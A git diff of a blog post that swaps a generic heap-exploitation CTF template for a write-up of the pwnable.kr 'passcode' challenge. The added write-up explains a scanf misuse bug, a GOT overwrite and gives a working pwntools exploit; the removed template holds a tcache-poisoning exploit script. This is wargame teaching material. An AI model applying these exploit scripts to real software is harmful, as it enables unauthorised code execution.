@@ -2,219 +2,155 @@
 title: "Passcode - pwnable.kr"
 date: 2024-11-15T10:30:00Z
 category: "ctf"
-tags: ["demo", "template", "heap-exploitation"]
+tags: ["pwnable", "CTF", "Write-What-Where"]
 challenge_category: "pwn"
-challenge_points: 450
-challenge_solves: 12
-summary: "Demo template for heap exploitation writeups - demonstrates proper formatting and structure."
-ctf_name: "Demo CTF"
+challenge_points: 20
+challenge_solves: 350
+summary: "Writeup of the pwnable passcode CTF Challenge"
+ctf_name: "pwnable.kr"
 image: "https://pwnable.kr/img/passcode.png"
 image_fit: "contain"
 ---
 
-# Demo Heap Challenge - Demo CTF
+# Passcode - Pwnable.kr
+## Understanding the Mitigations
+The challenge description is as follows:
+```
+Mommy told me to make a passcode based login system.
 
-**Category**: pwn
-**Points**: 450
-**Solves**: 12
+My initial C code was compiled without any error!
 
-*This is a demo template showing the proper structure for CTF writeups.*
+Well, there was some compiler warning, but who cares about that?
 
-## Challenge Description
+ssh passcode@pwnable.kr -p2222 (pw:guest)
 
 ```
-[Challenge description from CTF organizers would go here]
+Were given two files, the binary itself, and the source code.
 
-nc challenge.example.com 31337
-```
+Running this through my tool, [elfsec](https://github.com/gracecondition/elfsec):
+{{< figure src="/images/passcode/screenshot1.png" width="100%" align="center" >}}
 
-**Files**: `binary_name`, `libc.so.6`
-
-## Initial Analysis
-
-Binary checksec and basic reconnaissance:
-
-```bash
-$ file binary_name
-binary_name: ELF 64-bit LSB executable, x86-64, dynamically linked
-
-$ checksec binary_name
-[*] '/path/to/binary_name'
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-```
-
-## Static Analysis
-
-Decompiled pseudocode from Ghidra/IDA would go here:
-
+PIE is disabled, but other than that, all common mitigations are on.
+## Reading the source code
+Heres ``passcode.c``:
 ```c
-void main() {
-    setup();
-    puts("Welcome to the challenge!");
+#include <stdio.h>
+#include <stdlib.h>
 
-    while (1) {
-        menu();
-        int choice = get_int();
+void login(){
+	int passcode1;
+	int passcode2;
 
-        switch (choice) {
-            case 1: allocate_chunk(); break;
-            case 2: free_chunk(); break;
-            case 3: edit_chunk(); break;
-            case 4: view_chunk(); break;
-            case 5: exit(0); break;
-            default: puts("Invalid choice"); break;
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);
+
+	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+	printf("checking...\n");
+	if(passcode1==123456 && passcode2==13371337){
+                printf("Login OK!\n");
+		setregid(getegid(), getegid());
+                system("/bin/cat flag");
         }
-    }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	printf("Toddler's Secure Login System 1.1 beta.\n");
+
+	welcome();
+	login();
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;	
 }
 ```
+### The bugs in the source code
+#### Incorrect usage of scanf()
+The value that is passed into scanf needs to be a pointer to a variable.
+More specifically, the correct way to pass a variable to scanf is using the ``&`` symbol since its expecting a pointer. 
+### Uninitialized Data Usage
+Due to the way scanf is being used, and the variables its reading from ``passcode1`` & ``passcode2`` being unitialized,
+we have an Uninitialized Data Access (UDA) bug.
+This means that scanf is going to fetch random data from the stack at the stack offset of passcode1 and passcode2.
+### Write what were
+When the first scanf happens, its going to write whatever we give it, to whatever happened to be in the stack at the memory address
+``passcode1`` points to.
 
-Key functions analysis:
-
-### allocate_chunk()
+It helps to think of scanf like this:
 ```c
-void allocate_chunk() {
-    int idx = get_index();
-    // Function implementation details
-}
+scanf(stdin, "%d", passcode1);
 ```
+## Exploitation
+### Finding the offsets
+Using pwndbg, I found the following offset:
 
-### free_chunk()
-```c
-void free_chunk() {
-    int idx = get_index();
-    // Function implementation with potential bug
-}
-```
+{{< figure src="/images/passcode/screenshot2.png" width="100%" align="center" >}}
 
-## Vulnerability Analysis
+From this we can gather that I can set values in the ``eax`` register, and the ``edx`` register,
+which further coroborates that there is an arbitrary write bug here.
+### Finding the necessary addresses:
+For this exploit, im thinking of overwriting the Global Offset Table (GOT), a table where external functions are linked to at runtime.
+Since this binary is only partial relro, the global offset table is writeable.
+If you have no clue what any of that means, please read me other [blogpost](http://gracecondition.github.io/posts/machsec-documentation/)
+But put simply, this is a table that contains the addresses of external functions. If we overwrite one of this table's functions address,
+the next time that specific function is called, our own code will be run instead.
+on the various kinds of mitigations available on modern Unix based operating systems.
 
-Description of the vulnerability found:
-- **Vulnerability Type**: (e.g., Use-After-Free, Buffer Overflow, Double-Free)
-- **Location**: Where it occurs in the code
-- **Primitives**: What capabilities it provides (arbitrary read/write, info leak, etc.)
+First, we need to find where a function we want to overwrite is located on the global offset table:
+This can be done rather easily with IDA Pro, or pwndbg. To each their own.
 
-Example vulnerability description:
-1. The vulnerability allows editing freed chunks
-2. This leads to heap metadata corruption
-3. Can achieve arbitrary write primitive
 
-## Exploitation Strategy
+{{< figure src="/images/passcode/screenshot3.png" width="100%" align="center" >}}
 
-High-level exploitation plan:
+Now we also need to figure out where we need to redirect code execution. 
 
-1. **Leak libc addresses** using unsorted bin or other technique
-2. **Gain primitive** through tcache/fastbin poisoning or similar
-3. **Overwrite target** such as `__free_hook` or `__malloc_hook`
-4. **Trigger shell** by executing system("/bin/sh") or equivalent
+Looking at it in IDA, again:
+{{< figure src="/images/passcode/screenshot4.png" width="100%" align="center" >}}
 
-## Exploitation Implementation
+The reason we are jumping to this specific section of the code, is because we need to have the two calls that set permissions properly
+in order for the binary to have sufficient permissions to read the flag.
 
-```python
-#!/usr/bin/env python3
+### Final exploit source code
+Using pwntools, I devised the following exploit:
+```python3
 from pwn import *
 
-# Setup
-context.arch = 'amd64'
-context.log_level = 'debug'
+context.binary = ELF('./passcode')
+elf = context.binary
+context.arch = 'i386'
 
-# Connection
-if args.REMOTE:
-    p = remote('challenge.example.com', 31337)
-else:
-    p = process('./binary_name')
+fflush_got     = 0x0804C014
+system_gadget  = 0x080492A1
+offset = 96
 
-# Helper functions
-def allocate(idx, size):
-    p.sendlineafter(b'> ', b'1')
-    p.sendlineafter(b'Index: ', str(idx).encode())
-    p.sendlineafter(b'Size: ', str(size).encode())
+# SSH connection (this is the only correct way)
+s = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
+p = s.process('./passcode')
 
-def free(idx):
-    p.sendlineafter(b'> ', b'2')
-    p.sendlineafter(b'Index: ', str(idx).encode())
+payload  = b"A" * offset
+payload += p32(fflush_got)
 
-def edit(idx, data):
-    p.sendlineafter(b'> ', b'3')
-    p.sendlineafter(b'Index: ', str(idx).encode())
-    p.sendafter(b'Data: ', data)
+p.sendline(payload)
+p.sendline(str(system_gadget).encode())
 
-def view(idx):
-    p.sendlineafter(b'> ', b'4')
-    p.sendlineafter(b'Index: ', str(idx).encode())
-
-# Step 1: Leak libc base
-log.info("Step 1: Leaking libc base address")
-
-# Create chunks for leak
-allocate(0, 0x420)  # Large chunk for unsorted bin
-allocate(1, 0x20)   # Prevent consolidation
-
-# Free and leak
-free(0)
-view(0)
-p.recvuntil(b'Data: ')
-leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-
-# Calculate addresses
-libc_base = leak - 0x1ebbe0  # Adjust offset for your libc version
-system = libc_base + 0x55410
-free_hook = libc_base + 0x1eee48
-
-log.success(f"Libc base: {hex(libc_base)}")
-
-# Step 2: Tcache poisoning or similar technique
-log.info("Step 2: Performing heap exploitation")
-
-# Exploitation steps here
-allocate(3, 0x60)
-allocate(4, 0x60)
-free(3)
-free(4)
-
-# Corrupt tcache linked list
-edit(4, p64(free_hook))
-
-# Step 3: Get arbitrary write
-log.info("Step 3: Getting arbitrary write primitive")
-
-# Allocate to get control
-allocate(6, 0x60)
-allocate(7, 0x60)
-
-# Write to target
-edit(7, p64(system))
-
-# Step 4: Get shell
-log.info("Step 4: Getting shell")
-
-# Trigger exploit
-allocate(9, 0x20)
-edit(9, b"/bin/sh\x00")
-free(9)
-
-# Shell!
 p.interactive()
 ```
+And thats it, we get the flag.
 
-## Key Insights
+!pwn!
 
-- Understanding of heap allocator internals is crucial
-- Modern mitigations require creative bypass techniques
-- Heap feng shui is often necessary for reliable exploitation
-- Information leaks are typically required to defeat ASLR
-
-## Mitigation
-
-The vulnerability could be prevented by:
-- Setting pointers to NULL after freeing
-- Implementing proper bounds checking
-- Using memory-safe languages or smart pointers
-- Enabling additional heap protections (e.g., GWP-ASan, tcache hardening)
-
----
-
-**Flag**: `FLAG{demo_flag_format_here}`
